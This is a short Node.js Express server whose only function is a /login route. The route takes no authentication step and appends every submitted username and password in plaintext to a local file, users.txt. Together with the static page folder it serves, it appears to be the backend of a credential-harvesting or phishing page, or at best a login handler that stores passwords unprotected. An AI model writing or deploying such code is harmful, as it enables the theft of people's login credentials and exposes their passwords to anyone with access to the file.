const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const logEntry = `Username: ${username}, Password: ${password}\n`;

  fs.appendFile('users.txt', logEntry, (err) => {
    if (err) {
      return res.status(500).send('Failed to save data.');
    }
    res.send('Login data saved successfully!');
  });
});

app.listen(PORT, () => {
  console.log(`✅ Server running at http://localhost:${PORT}`);
});
